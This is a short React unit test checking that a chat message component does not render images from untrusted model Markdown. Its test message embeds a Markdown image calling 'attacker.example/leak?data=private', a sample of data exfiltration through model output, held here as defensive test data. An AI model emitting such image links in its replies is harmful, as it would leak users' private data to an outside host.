import { describe,it,expect,vi,afterEach } from 'vitest';
import { render,screen,cleanup } from '@testing-library/react';
import { TerminalMessage } from '../components/chat/TerminalMessage';
afterEach(()=>{cleanup();vi.restoreAllMocks();});
describe('untrusted source rendering',()=>{
 it('does not create tracking image requests from model Markdown',()=>{
  render(<TerminalMessage message={{id:'source-msg',role:'tars',content:'Evidence ![tracking](https://attacker.example/leak?data=private)',timestamp:new Date()}}/>);
  expect(screen.queryByRole('img')).toBeNull();
 });
});
